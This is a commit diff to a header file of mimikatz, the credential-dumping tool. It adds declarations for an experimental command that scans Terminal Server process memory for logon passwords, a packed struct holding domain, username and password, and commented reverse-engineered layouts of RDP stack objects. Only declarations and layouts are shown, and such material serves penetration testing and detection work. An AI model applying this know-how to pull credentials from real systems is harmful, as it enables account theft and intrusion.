86679021ee7bb30cea5e410eb233af6e4e66733c
Benjamin DELPY <benjamin@gentilkiwi.com>
2021-05-17 23:49:18 +0200

    [new] mimikatz ts::logonpasswords (experimental) - try to dump passwords from Terminal Server service (8.1+/2012R2+)

--- mimikatz/modules/kuhl_m_ts.h
+++ mimikatz/modules/kuhl_m_ts.h
@@ -5,16 +5,21 @@
 */
 #pragma once
 #include "kuhl_m.h"
-#include "../modules/kull_m_patch.h"
-#include "../modules/kull_m_service.h"
-#include "../modules/kull_m_process.h"
-#include "../modules/kull_m_memory.h"
+#include "../../modules/kull_m_patch.h"
+#include "../../modules/kull_m_service.h"
+#include "../../modules/kull_m_process.h"
+#include "../../modules/kull_m_memory.h"
+#include "../../modules/kull_m_crypto_remote.h"
 
 const KUHL_M kuhl_m_ts;
 
 NTSTATUS kuhl_m_ts_multirdp(int argc, wchar_t * argv[]);
 NTSTATUS kuhl_m_ts_sessions(int argc, wchar_t * argv[]);
 NTSTATUS kuhl_m_ts_remote(int argc, wchar_t * argv[]);
+NTSTATUS kuhl_m_ts_logonpasswords(int argc, wchar_t * argv[]);
+
+BOOL CALLBACK kuhl_m_ts_logonpasswords_MemoryAnalysis(PMEMORY_BASIC_INFORMATION pMemoryBasicInformation, PVOID pvArg);
+void kuhl_m_ts_logonpasswords_MemoryAnalysis_candidate(PKULL_M_MEMORY_HANDLE hProcess, PVOID Addr);
 
 #define LOGONID_CURRENT			((ULONG) -1)
 #define SERVERHANDLE_CURRENT	((HANDLE) NULL)
@@ -195,3 +200,61 @@ extern BOOLEAN WINAPI WinStationSetInformationW(IN HANDLE hServer, IN ULONG Sess
 
 extern LPWSTR NTAPI RtlIpv4AddressToStringW(IN const IN_ADDR *Addr, OUT LPWSTR S);
 extern LPWSTR NTAPI RtlIpv6AddressToStringW(IN const PVOID /*IN6_ADDR **/Addr, OUT LPWSTR S);
+
+typedef struct _STRUCT_DATASEARCH {
+	PKULL_M_MEMORY_HANDLE hMemory;
+	KULL_M_MEMORY_ADDRESS aPattern;
+} STRUCT_DATASEARCH, *PSTRUCT_DATASEARCH;
+
+#define WTS_DOMAIN_LENGTH            255
+#define WTS_USERNAME_LENGTH          255
+#define WTS_PASSWORD_LENGTH          255
+#pragma pack(push, 2)
+typedef struct _WTS_KIWI {
+	DWORD unk0;
+	DWORD unk1;
+	WORD cbDomain;
+	WORD cbUsername;
+	WORD cbPassword;
+	DWORD unk2;
+	WCHAR Domain[WTS_DOMAIN_LENGTH + 1];
+	WCHAR UserName[WTS_USERNAME_LENGTH + 1];
+	WCHAR Password[WTS_PASSWORD_LENGTH + 1];
+} WTS_KIWI, *PWTS_KIWI;
+#pragma pack(pop)
+
+/*
+typedef struct _STRUCT_MYSEARCH {
+	LPCSTR pCRDPWDUMXStack; // "CRDPWDUMXStack"
+	DWORD unk0; // 0xdbcaabcd
+	DWORD unk1; // 0x00000001
+} STRUCT_MYSEARCH, *PSTRUCT_MYSEARCH;
+
+typedef struct _UNK_STRUCT0 { // 0x2f8
+	PVOID unkp0; // &CTSAsyncResultImpl::`vftable'{for `INonDelegatingUnknown'};
+	PVOID unkp1; // &CTSUnknownCrossModule::`vftable'{for `CTSObject'};
+	LPCSTR pCRDPWDUMXStack; // "CRDPWDUMXStack"
+	DWORD unk0; // 0xdbcaabcd
+	DWORD unk1; // 0x00000001
+	PVOID unkThis0; // this
+	DWORD unk2; // 0, 2 ?
+	PVOID unkp2; // &CTSUnknownCrossModule::`vftable'
+	PVOID ImageBase; //
+	PVOID unkp3; // &CRDPWDUMXStack::`vftable'{for `IRDPWDUMX_StackEx'};
+	PVOID unkp4; // &CRDPWDUMXStack::`vftable'{for `IRDPENCNetStreamEvents'};
+	PVOID unkp5; // &CRDPWDUMXStack::`vftable'{for `IRDPNetworkDetectTransport'};
+	DWORD unk3; // 1 ?
+	DWORD unk4; // ?
+	DWORD unk5; // 1 ?
+	DWORD unk6; // 59 ? 
+	DWORD unk7; //
+	// align
+	PVOID unkp6; //
+	PVOID unkp7; //
+	PVOID unkp8;
+	PVOID unkp9;
+	PVOID unkp10; /// :)
+	PVOID unkp11;
+	PVOID unkp12;
+} UNK_STRUCT0, *PUNK_STRUCT0;
+*/
